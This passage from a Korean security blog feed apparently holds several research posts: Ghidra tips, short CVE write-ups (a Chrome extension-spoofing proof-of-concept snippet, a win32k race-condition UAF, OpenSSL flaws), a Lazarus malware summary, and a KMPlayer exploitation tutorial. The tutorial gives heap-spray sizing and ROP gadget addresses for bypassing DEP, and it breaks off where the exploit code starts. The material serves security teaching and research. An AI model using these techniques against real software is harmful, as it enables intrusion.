마시면서 오늘의 주제인 IDA 사용자를 위한 ghidra 팁! 을 시작해보겠습니다!</p><h1 id="API-call-parameter-자동-코멘트"><a href="#API-call-parameter-자동-코멘트" class="headerlink" title="API call parameter 자동 코멘트"></a>API call parameter 자동 코멘트</h1><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%202.png"></p><p>IDA의 경우 위와 같이 Windows API가 호출될 경우, 각 파라미터의 이름을 코멘트로 달아줍니다.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%203.png"></p><p>하지만 analysis를 할 때 기본 설정으로 진행을 한다면 ghidra는 코멘트를 달아주지 않습니다. 물론 <code>memset</code>이라 적힌 부분에 있는 코멘트를 보면 어떠한 파라미터 이름이 있는지 알 수 있고 그거에 따라서 매치를 하면 되긴 합니다만… 한 번 더 생각을 해야 하니 좀 불편하죠.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%204.png"></p><p>analysis option에서 WindowsPE x86 Propagate External Parameters 옵션을 체크한 후 Analyze를 진행하면..?</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%205.png"></p><p>어떤 함수에서 사용되는 파라미터인지, 파라미터의 자료형과 이름까지 모두 코멘트로 작성됩니다!</p><p>혹시.. 옵션을 설정하는 걸 까먹고 Analyze를 진행을 하셨다면 굳이 껐다 킬 필요가 없습니다.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%206.png"></p><p>Analysis - One Shot - WindowsPE x86 Propagate External Parameters를 통해서 진행을 할 수 있습니다.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%207.png"></p><h1 id="flag-constant-설정"><a href="#flag-constant-설정" class="headerlink" title="flag constant 설정"></a>flag constant 설정</h1><p>악성코드 분석 등을 하다 보면 <code>CreateFileA()</code> 등의 API를 사용하는 경우가 많습니다. 그리고 이러한 API들은 flag 값에 <code>0x00000004</code>이 <code>FILE_SHARE_DELETE</code>라던지의 constant를 갖는 경우가 많이 있죠.</p><p>IDA에서는 해당하는 값을 우클릭하여 ‘Use standard symbolic constant’를 사용하여 값을 변경할 수 있습니다.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%208.png"></p><p><code>CreateProcessA</code>의 <code>0x80000000</code> 플래그 값은 <code>CREATE_NO_WINDOW</code>의 값을 가지고 있습니다. 따라서 이를 선택하여 설정하면</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%209.png"></p><p>이런 식으로 표시가 됩니다.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2010.png"></p><p>ghidra에서 확인한 똑같은 부분입니다. <code>0x80000000</code> 부분을 똑같이 <code>CREATE_NO_WINODW</code>로 표시할 수 있는 방법은 똑같습니다. 해당 부분을 우클릭하고 ‘Set Equation(단축키 E)’를 누릅니다.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2011.png"></p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2012.png"></p><p>해당 창을 확인하시면 여러 가지 값들이 뜹니다.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2013.png"></p><p>IDA에서 뜨는 창과 비교해 봤을 때, 큰 차이가 없죠? 이제 저기서 <code>CREATE_NO_WINDOW</code>를 선택하시면 됩니다.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2014.png"></p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2015.png"></p><p><code>0x80000000</code>이 모두 <code>CREATE_NO_WINDOW</code>로 바뀐 것을 확인할 수 있습니다!</p><h1 id="분량-조절-실패"><a href="#분량-조절-실패" class="headerlink" title="분량 조절 실패!"></a>분량 조절 실패!</h1><p>예상치 못하게 분량 조절을 실패해버렸습니다! unreachable code 등의 부분은 기본 설정으로 되어 있고… (분명 예전에는 기본 설정 아니었던 것 같은데 업데이트하면서 바뀌었나…? ㅠㅠ) IDAPython이나 그래프 뷰 등은 이전 파트에서 다루었죠.</p><p>사실 이 부분에서 WinAPI에 대한 것을 다룬 이유는 다음 파트를 위해서입니다… 급하게 마무리하는 것이 아닙니다. Part 4에서는 악성코드를 ghidra로 분석해보려 합니다!</p><p>와! 악성코드를 분석하려면 API 파라미터에 어떤 게 들어가는지 알아야 하고, flag 값도 hex로 나오는 것보다 constant 이름을 알려주면 너무나도 편리하잖아? 맞죠? 그렇죠? …. 다음에는 풍족한 분량의 글을 가져오도록 하겠습니다. 하하</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2016.png"></p><p>머리를 박으며 다음 파트를 준비해오도록 하겠습니다! 감사합니다!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21123: Chrome에서 발생하는 확장자 spoofing</title>
    <link href="/2021/04/03/fabu1ous/2021-04-03/"/>
    <url>/2021/04/03/fabu1ous/2021-04-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1137247">Issue 1137247: Security: Spoofing download filename extension in 86 chrome</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt; 88.0.4324.96</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><blockquote><p>CVE-2021-21123:  88.0.4324.96 이전 Google Chrome의 File System API에서 불충분한 데이터 유효성 검사를 통해 공격자는 조작된 HTML 페이지를 통해 파일 시스템 제한을 무시할 수 있습니다. </p></blockquote><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">        <span class="hljs-keyword">const</span> butSaveNewFile = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;addNewFile&#x27;</span>)</span><span class="javascript">        butSaveNewFile.addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; &#123;</span><span class="javascript">            <span class="hljs-keyword">const</span> options = &#123;</span>                types: [                    &#123;                        description:<span class="javascript">                            <span class="hljs-string">&#x27;JPEG Image (*.jpeg)                                                                                                                                                                                                                                                         &#x27;</span>,</span>                        accept: &#123;<span class="javascript">                            <span class="hljs-string">&#x27;text/plain&#x27;</span>: [<span class="hljs-string">&#x27;.bat&#x27;</span>]</span>                        &#125;,<span class="javascript">                        content: <span class="hljs-string">&#x27;C:\\Windows\\system32\\calc.exe&#x27;</span></span>                    &#125;                ]            &#125;<span class="javascript">            <span class="hljs-keyword">const</span> handle = <span class="hljs-keyword">await</span> <span class="hljs-built_in">window</span>.showSaveFilePicker(options)</span><span class="javascript">            <span class="hljs-keyword">const</span> writable = <span class="hljs-keyword">await</span> handle.createWritable()</span><span class="javascript">            <span class="hljs-keyword">await</span> writable.write(<span class="hljs-string">&#x27;C:\\Windows\\system32\\calc.exe&#x27;</span>)</span><span class="javascript">            <span class="hljs-keyword">await</span> writable.close()</span><span class="javascript">            alert(<span class="hljs-string">&#x27;File saved&#x27;</span>)</span>        &#125;)    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>위는 공개된 HTML PoC의 일부입니다. 변수  <code>description</code>의 값은 Google Chrome이 호출하는 “Save as(다른 이름으로 저장)” 창에서 다운로드될 파일의 확장자를 사용자에게 보여주는 용도로 사용됩니다. <code>description</code>에 연속적인 공백 문자 혹은 <code>*</code>이 포함되지 못하도록 막는 필터링의 부재로 인해 다운로드될 파일의 실제 확장자를 숨기거나 속일 수 있습니다(Spoofing download filename). 해당 취약점을 악용해 원격으로 타겟 시스템에 악성 코드를 설치 및 실행할 수 있기 때문에 User Interaction이 필요함에도 불구하고 높은 심각도의 취약점으로 분류됐습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>spoofing</tag>
      
      <tag>chrome</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26863: race condition을 통한 win32k 커널 UAF 취약점</title>
    <link href="/2021/04/02/l0ch/2021-04-02/"/>
    <url>/2021/04/02/l0ch/2021-04-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2139">Issue 2139: Windows Kernel win32k UAF of the PDEVOBJ object via a race condition in NtGdiGetDeviceCapsAll</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>win32k kernel</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Project Zero팀이 Windows Kernel에서 발생하는 race condition을 통한 UAF 취약점의 세부 보고서를 공개했습니다.</p><p>취약점이 존재하는 <code>NtGdiGetDeviceCapsAll</code> 함수는 GDI에서 내부적으로 사용하는 system call입니다.</p><pre><code class="hljs cpp">...<span class="hljs-function">BOOL <span class="hljs-title">NtGdiGetDeviceCapsAll</span><span class="hljs-params">(HDC hdc, DEVCAPS *devcaps)</span> </span>&#123;BOOL bRet = TRUE;PDEVOBJ *pdevobj;<span class="hljs-keyword">if</span> (PsGetWin32KFilterSet() == <span class="hljs-number">5</span> &amp;&amp; hdc == <span class="hljs-number">0xFFFFFFFFDCDE5000</span>) &#123;pdevobj = gpDispInfo-&gt;pdevobj;<span class="hljs-comment">// DCOBJ scope</span>&#125; <span class="hljs-keyword">else</span> &#123;DCOBJ dc(hdc); <span class="hljs-comment">//[1]</span><span class="hljs-keyword">if</span> (!dc.valid) &#123;EngSetLastError(ERROR_INVALID_HANDLE);DCOBJ::~DCOBJ(dc);<span class="hljs-keyword">return</span> FALSE;&#125;pdevobj = dc.pdevobj;DCOBJ::~DCOBJ(dc);&#125;<span class="hljs-comment">// DCOBJ scope</span>__try &#123;ProbeForWrite(devcaps, <span class="hljs-keyword">sizeof</span>(DEVCAPS), <span class="hljs-number">1</span>);vGetDeviceCaps(pdevobj, devcaps);  <span class="hljs-comment">//[2]</span>&#125;except(EXCEPTION_EXECUTE_HANDLER) &#123;bRet = FALSE;&#125;<span class="hljs-keyword">return</span> bRet;&#125;...</code></pre><p>해당 함수는 <a href="https://docs.microsoft.com/ko-kr/cpp/mfc/device-contexts?view=msvc-160">Device Context(DC)</a> 핸들을 얻어 장치 정보를 <code>DEVCAPS</code> 구조체에 저장하는 기능을 수행합니다.</p><p><code>DCOBJ</code> 객체인 <code>dc</code>를 <code>else</code> 문 내부에서 선언해 해당 객체의 scope가 <code>else</code>문으로 한정됩니다. 또한 객체가 syscall 전체에서 활성화된 상태를 유지할 수 있는 메커니즘이 존재하지 않아 <code>else</code> 코드를 벗어나면 <code>DCOBJ::~DCOBJ(dc)</code> 소멸자가 자동으로 호출되어 <code>dc</code>에 대한 참조가 삭제됩니다. 결과적으로 <code>dc</code>를 참조하는 <code>pdevobj</code> 객체가 race condition의 영향을 받습니다.</p><p>위 취약점을 악용해 [1]에서 <code>DCOBJ</code>생성자에 의해 참조된 이후 다른 스레드가 [2]에서 <code>vGetDeviceCaps()</code> 호출 전 또는 도중 <code>Device Context</code>를 닫는 경우 해제된 메모리에 액세스 할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>race condition</tag>
      
      <tag>L0ch</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CA certificate check bypass &amp; NULL pointer deref in OpenSSL</title>
    <link href="/2021/04/01/insu/2021-04-01/"/>
    <url>/2021/04/01/insu/2021-04-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.openssl.org/news/secadv/20210325.txt">OpenSSL Security Advisory [25 March 2021]</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OpenSSL</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>OpenSSL에서 CA 인증 bypass와 Null Pointer Dereference 취약점(Denial-of-Service)이 발견되었습니다. </p><p><strong>CA certificate check bypass</strong></p><p>X509_V_FLAG_X509_STRICT flag를 사용하여 추가 보안 검사를 할 수 있습니다.</p><p>타원 곡선 변수를 인코딩한 체인의 인증서를 허용하지 않는 검사가 추가되었습니다.</p><p>이이 검사를 진행할 때, 인증서가 유효한 CA 인정서인지 확인하는 이전의 검사 결과를 덮어 씌워 취약점이 발생했습니다.</p><p><strong>Null pointer dereference</strong></p><p>client에서 조작된 renegotiation ClientHello message를 보낸 경우, 취약점이 발생합니다.</p><p>만약 initalize에서 TLSv1.2 renegotiation ClientHello가 signature_algorithms extension을 설정하지 않지만, signature_algorithms_cert extension을 포함한다면 null pointer deref 취약점이 발생합니다.</p><p>이 취약점은 <a href="https://github.com/terorie/cve-2021-3449">링크</a>에서 확인할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>insu</tag>
      
      <tag>openssl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 일본을 타깃으로 한 라자루스 멀웨어 VSingle, ValeforBeta</title>
    <link href="/2021/04/01/idioth/2021-04-01/"/>
    <url>/2021/04/01/idioth/2021-04-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html">Lazarus Attack Activities Targeting Japan (VSingle/ValeforBeta)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Japanese orgainsations</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>일본을 타깃으로 라자루스가 사용한 멀웨어 VSingle과 ValeforBeta에 대한 분석 보고서가 공개되었습니다.</p><p>VSingle은 원격 네트워크에서 임의 코드 실행, 플러그인 다운로드 및 실행을 하는 HTTP 봇입니다. 해당 멀웨어는 설치되면 Explorer를 실행하고 DLL injection을 통해 메인 코드를 실행합니다. VSingle은 HTTP GET request를 통해 C2 서버와 통신합니다. request는 base64로 인코딩 되어있으며, IP 주소, Windows 버전 등을 포함합니다. response를 통해 서버에서 명령어가 포함된 AES 암호화 데이터를 다운로드 받습니다. VSingle이 수행할 수 있는 명령어는 다음과 같습니다.</p><ol><li>파일 업로드</li><li>communication interval 설정</li><li>임의 명령 실행</li><li>플러그인 다운로드/실행</li><li>업데이트</li><li>멀웨어 정보 전송</li><li>uninstall</li><li>다운로드 파일</li></ol><p>VSingle은 4 가지 유형의 플러그인(Windows PE 파일, VBS 파일, BAT 파일, 쉘 코드)을 실행합니다. 플러그인은 <code>%TEMP%</code> 폴더에 저장된 후 쉘 코드를 제외한 3개의 플러그인을 실행합니다.</p><p>ValeforBeta는 Delphi로 작성된 HTTP 봇으로 원격 네트워크에서 임의 코드 실행, 파일 업로드, 다운로드 기능을 가지고 있습니다. <code>INTERNET_OPEN_TYPE_DIRECT</code>, <code>INTERNET_OPEN_TYPE_PRECONFIG</code>, <code>INTERNET_OPEN_TYPE_PROXY</code>의 access type을 가지고 있으며 POST request를 통해 C2 서버와 통신합니다. POST request에는 데이터가 포함되어 있지 않고 쿠키 헤더의 <code>JSESSIONID=</code> 뒤에 감염된 호스트의 정보가 base64 인코딩 되어 전송됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>lazarus</tag>
      
      <tag>bot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 버그헌팅 튜토리얼 Part 4</title>
    <link href="/2021/03/31/l0ch/bughunting-tutorials-part4/"/>
    <url>/2021/03/31/l0ch/bughunting-tutorials-part4/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">버그헌팅 튜토리얼 Part 1</a></p><p><a href="https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/">버그헌팅 튜토리얼 Part 2</a></p><p><a href="https://hackyboiz.github.io/2021/03/24/l0ch/bughunting-tutorials-part3/">버그헌팅 튜토리얼 Part 3</a></p><p>어느덧 버그헌팅 튜토리얼의 마지막 글입니다. Part 3 에서 바로 이어지는 내용이니 긴말 없이 바로 시작해볼게요!</p><hr><p>이제부터는 콜 스택을 복구해볼 겁니다. 콜 스택을 복구하면 우리가 어느 정도의 코드를 봐야 하는지 사이즈가 나옵니다. 이걸 복구하고 어느 부분부터 분석하면 좋을지를 판단할 겁니다.</p><p>콜 스택을 복구하는 방법 역시 위에서 아래로(탑다운) 아래에서 위로(바텀업) 뭘 어떻게 하던 상관없습니다. 그냥 자신이 편하신 대로 하면 됩니다. 바텀업 방식으로 할 때에는 크래시가 발생하는 함수의 처음 부분에 브레이크 포인트를 걸어서 바로 직전의 리턴 어드레스를 보면서 하나하나 올라가면 됩니다. 탑다운 방식으로 할 경우 동적 디버깅과 정적 디버깅을 적절히 사용하면 됩니다. 일단 제일 위(라고 생각하는 함수)에 전달되는 인자를 보고 먼저 정적 리버싱을 진행합니다. 그리고 결과들을 기반으로 동적 디버깅을 같이 수행하면 됩니다.</p><p>나는 아무 생각이 없다!!! 그냥 리버싱을 최대한 줄이고 싶어요!!! 시간은 많아요!!!(는 개뿔 제로데이는 묵히면 똥 됩니다)라고 하시는 분들은 그냥 제일 위에 있는 함수에서 p 누르고 크래시 터지면 프로그램 재시작하고 그 시점으로 가서 다시 p 누르고… 이렇게 쭉쭉 내려가는 방법도 있습니다. 무식하지만 확실하기도 하죠…. 는 시간 낭비 개쩔… 스레드 잘못 분석하면 리얼 시간 낭비… (스레드는 힙을 공유하기 때문에 여러 개의 스래드가 사용하는 힙에서 오버플로우가 발생하면 취약점이 존재하는 스레드 말고 다른 스레드에서도 크래시가 발생할 수 있습니다)ㅋㅋㅋㅋㅋㅋ 뭐 그래도 이것만큼 생각 없이 하는 건 없는 거 같네욬ㅋㅋㅋㅋㅋ (지극히 콜 스택 복구에만 해당되는 겁니다… 결국은 다 분석해야 돼요 ㅠㅠ)</p><p>콜 스택을 복구하고 천천히 따라다가 보면 아래와 같이 <code>ImLoader+0x27BB0</code> 에서 헤더 검사를 진행하는 것을 발견할 수 있습니다. (캡처 사진의 헥스레이 코드는 아이다 버전에 따라 조금씩 다를 수 있습니다)</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--048.png" alt="bughunting-tutorials-part4/image--048.png"></p><p><code>v7</code>에 있는 값이 <code>MB</code>(숫자로 되어 있어서 앞에서 못 찾은 거네요)인지 비교하고 틀리면 익셉션을 발생시키고 맞다면 해석을 진행하게 됩니다. 그럼 <code>sub_427620</code> 에서 파일 해석을 진행하면서 크래시가 발생하겠네요!!</p><p>그럼 이제부터는 실제 파일을 처리하는 함수가 어떻게 진행되는지 알아볼게요.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--050.jpg" alt="bughunting-tutorials-part4/image--050.jpg"></p><p>먼저 파라미터로 전달되어 온 Stream 값을 통해 <code>BITMAPINFOHEADER</code> 의 사이즈를 가져와서 지역변수에 저장해줍니다. 그럼 당연히 우리가 수정한 <code>0x1f28</code> 이겠죠? 그런 다음 <code>0x1f28+0x40c</code> 만큼 <code>BITMAPINFOHEADER</code> 를 저장하기 위한 메모리를 할당해주고 해당 주소를 header에 저장해줍니다. 그리고 <code>size</code> 와 <code>0xc</code> 가 같은 지 비교를 해서 결과 값을 <code>size_bool</code> 에 저장합니다. 이때 <code>size</code> 는 <code>0x1f28</code> 이기 때문에 <code>size_bool</code>에는 0 이 저장됩니다. 따라서 밑에 분기점에서 <code>size_bool</code> 이 <code>0</code> 이기 때문에 <code>else</code>로 빠지게 됩니다.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--052.png" alt="bughunting-tutorials-part4/image--052.png"></p><p><code>else</code>로 빠지게 되면 파일의 <code>BITMAPINFOHEADER</code> 시작 부분부터 <code>size</code>만큼 읽어와서 header에 저장하게 됩니다. 앞에서 <code>size+0x40c</code> 만큼 할당을 했기 때문에 오버플로우가 발생할 수 없습니다. </p><p>그런 다음, compression에 대한 분기문을 만나게 됩니다. 이 값은 <code>0x00</code> 에서 <code>0xa00</code>으로 수정했기 때문에 해당 분기로 들어갈 수 있게 됩니다. 분기로 들어가면 첫 번째로 하는 일이 오브젝트를 할당하네요. 그럼 <code>BITMAPINFOHEADER</code> 가 할당된 뒷부분에 할당이 되겠네요.(<code>BITMAPINFOHEADER</code> 가 페이지를 하나 더 할당할 만큼 크질 않으니) 이 부분이 중요합니다!!! 왜냐하면 우리가 덮게 될 객체니까요 ㅎㅎ(응? <code>BITMAPINFOHEADER</code>뒤에 할당된다며… 오버플로우 안 난다며….)</p><p>뒤에 더 보도록 하죠 ㅎㅎㅎㅎ</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--054.jpg" alt="bughunting-tutorials-part4/image--054.jpg"></p><p>이제는 <code>this</code> 에 <code>BITMAPINFOHEADER</code> 정보를 저장합니다. 참 찰지게 다 넣네요.<br>그리고 마지막에는 모든 비트맵 데이터를 저장합니다. 우리는 익스플로잇을 할 때 이 부분을 이용해서 스프레이를 할 수 있습니다 ㅎㅎ</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--056.jpg" alt="bughunting-tutorials-part4/image--056.jpg"></p><p>이제 취약점 부분입니다 ㅎㅎㅎ 드디어 ㅎㅎ</p><p>먼저 어떤 주소를 계산합니다. Header 주소 기준으로 <code>size</code> 만큼 뒤에 주소를 저장합니다. 그런 다음 밑에 모든 분기를 건너뛰고 <code>sub_41AAF0</code> 함수로 갑니다. 이 함수는 파일 스트림에서 <code>byte_4BA6F4[size_bool] * header-&gt;biClrUsed = 0x800</code> 만큼 읽어서 위에서 계산한 주소에 저장합니다.</p><p>여기에서 오버플로우가 발생합니다!!!! 아까 위에서 얘기했듯이 header 의 크기는 <code>size+0x40c</code>입니다 ㅋㅋㅋ 근데 여기에서는 <code>header+size</code> 에 <code>0x800</code> 바이트를 할당하니 뒤에 있는 객체를 덮게 되는 거죠!! 그럼 객체가 덮이기 전과 후를 한번 살펴볼게요!!</p><p>Before:</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--058.png" alt="bughunting-tutorials-part4/image--058.png"></p><p>After:</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--060.png" alt="bughunting-tutorials-part4/image--060.png"></p><p>헤헿 자 이제 그럼 <code>eip</code>를 잡을 수 있겠네요!!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--062.png" alt="bughunting-tutorials-part4/image--062.png"></p><p>네….? 뭘 잡는다는 거죠….? 쥬륵…. ㅠㅠ 후우 역시 인생은 험난하네요…</p><p>으음… 이제 디버깅해보면서 하나하나 해결해 나갈게요 ㅠㅠ<br>먼저 <code>0x11111111</code> 에 Access violation이 발생하는 것은 우리가 넣은 데이터가 유효한 메모리를 가리키게 하면 되겠죠!! 하지만!!! ASLR이 걸려있어서 그렇게 하는 게 쉽지 않다는 거…. 그렇기 때문에 스프레이를 진행해야 합니다. 다행히(??) KMPlayer와 ImLoader가 32 비트로 컴파일되어 있기 때문에 스프레이를 하면 어느 정도 릴라이어블하게 원하는 주소에 메모리를 매핑할 수 있습니다. 할당하는 메모리에 크기에 따라서 자주 매핑되는 주소가 달라집니다. 저는 여기에서 150M 정도를 0x11로 스프레이 했습니다. </p><p>150M로 스프레이한 이유는 디버깅할 때 이 정도 크기가 가장 적당한 속도가 나와서 인데요. 디버깅할 때 <code>0x11111111</code> 에 매핑이 안되면 다시 시작해서 테스트를 해야 되잖아요? 크기가 커지면 원하는 주소에 매핑이 더 잘되지만 윈도우가 업데이트를 하면 할수록 랜덤 마이징이 잘돼서 크기가 커도 잘 안되더라고요 ㅠㅠ(예전에는 300M 만 해도 거의 고정이라고 들었는데…) 가장 효율적이라고 생각하는 크기로 했습니다. 만약 원하는 데로 잘 된다면 아래와 같이 해당 주소에 잘 매핑된 것을 볼 수 있습니다!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--064.png" alt="bughunting-tutorials-part4/image--064.png"></p><p>그리고 이대로 실행하면!!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--066.png" alt="bughunting-tutorials-part4/image--066.png"></p><p>짝짝짝!! <code>eip</code>를 잡았습니다!!! 소리질러어어어어어어!!!! (하… 험난했다…) 이제 익스만 하면 되겠네요 ㅎㅎㅎ</p><hr><p>일단 어떻게 <code>eip</code>를 잡게 되었는지 함 볼게요. 일단 스택에 있는 리턴 어드레스를 확인해서 어디에서 <code>call</code> 혹은 <code>jmp</code>를 했는지 확인해볼게요.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--068.png" alt="bughunting-tutorials-part4/image--068.png"></p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--070.png" alt="bughunting-tutorials-part4/image--070.png"></p><p>스택에 있는 마지막 리턴 어드레스를 보니 <code>ImLoader+0x357f</code> 인 것을 확인할 수 있고 이 주소보다 위에 있는 instruction을 확인해보면 <code>call dword ptr [ecx-4]</code>인 것을 확인할 수 있습니다. 그리고 <code>ecx</code>는 <code>eax</code>가 가리키는 메모리에서 가져온 것이네요.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--072.png" alt="bughunting-tutorials-part4/image--072.png"></p><p>그럼 이제 중요한 거는 <code>0x11111111</code> 이 가리키는 데이터가 파일에서의 오프셋(위치??)이 <code>eax</code>가 가리키는 데이터의 오프셋이 일치하냐는 것인데요. 이 부분을 확인해보기 위해서 일단 <code>0x11111111</code> 부분이 어떤 위치에 있는지 보겠습니다.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--074.jpg" alt="bughunting-tutorials-part4/image--074.jpg"></p><p>마지막 메모리가 전체 비트맵 이미지를 담고 있는 부분이기 때문에 해당 메모리 기준으로 계산하면 됩니다. <code>0x11111111 – 0x101cb056 = 0xF460BB</code> 네요. 앞에서 객체를 덮을 때에는 파일 기준으로 앞부분 데이터를 가져와 복사하기 때문에 페이로드를 담는 데에는 큰 문제가 없을 것 같습니다!!</p><p>자 이제 페이로드를 작성해야 합니다. 페이로드를 작성하기 전에 MONA와 메타스플로잇을 사용해서 모듈들의 미티게이션 적용 항목, 필요한 가젯 검색, 쉘 코드 생성을 해야 하는 데 이 부분은 인터넷을 검색하면 많이 나오기 때문에 생략하도록 하겠습니다. 결론적으로 <code>KMPlayer.exe</code> 에 Rebase가 안 걸려있어서 <code>KMPlayer.exe</code> 에 있는 가젯을 사용하도록 할 것이고요, 메타스플로잇을 통해서는 계산기를 실행시키는 쉘 코드를 만들 것입니다.</p><p>일단 ASLR은 스프레이로 어느 정도 커버하였고 DEP만 무력화시키고 쉘 코드를 작성하면 됩니다. DEP를 무력화하려면 ROP를 해야죠!! 이제 <code>esp</code>를 우리 데이터가 있는 힙 메모리로 피봇 시킬 것입니다. 음 적당한 가젯을 찾아보도록 하죠.</p><pre><code class="hljs c"><span class="hljs-number">0x00523702</span> : # PUSH ECX # POP ESP # POP ESI # POP EBX # RETN</code></pre><p>일부로 두 번 더 <code>POP</code> 해주는 이유는 위에 보시다시피 <code>0x11111111</code> 부분에 8 바이트가 다른 데이터로 덮여 있기 때문에 이 8 바이트를 뛰어넘고 리턴하기 위함입니다.</p><p>자 그러면 페이로드를 작성할 때 아래와 같이 하면 되겠네요.</p><p>제일 처음 부분에는 위 가젯의 주소를 사용할 겁니다. 그리고 바로 그 뒤에는 또 피봇 하는 가젯을 넣어줄 겁니다. 이번에는 그냥 힙에서만요. 왜냐하면 이번에는 <code>0x101cb056</code> 에 매핑이 되었지만 다음에 또 이 언저리 주소에 매핑될 때도 이 주소라는 보장이 없으니깐요. 최소한 하위 2 바이트는 바뀌겠죠. 그렇기 때문에 <code>esp</code>를 스택에서 힙으로, 다시 힙에서 다 높은 주소의 힙으로 피봇 하는 가젯 두 개를 스프레이 해줄 겁니다. 힙에서 힙으로 피봇 하는 가젯은 아래 걸로 쓰도록 할게요.</p><pre><code class="hljs c"><span class="hljs-number">0x0095dffa</span> : # ADD ESP,<span class="hljs-number">19010</span> # POP EBP # POP EDI # POP ESI # POP EBX # RETN</code></pre><p>그리고 중간중간에 프로그램에서 힙을 쓰다가 바꾼 메모리들을 스킵할 수 있도록 아래 가젯을 사용하겠습니다.</p><pre><code class="hljs c"><span class="hljs-number">0x00433712</span> : # POP EDX # POP EDI # POP ESI # POP EBX # RETN</code></pre><p>그리고 이제 높은 주소로 피봇 했으면 그 부분에도 <code>ret</code>으로 스프레이를 해주면 좀 더 정확도가 높아지겠네요 ㅎㅎ</p><p>그럼 파일을 구성할 때에는 아래와 같이 하면 되겠네요</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/Untitled.png" alt="bughunting-tutorials-part4/Untitled.png"></p><p>아래는 제가 작성한 익스플로잇 코드입니다.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> 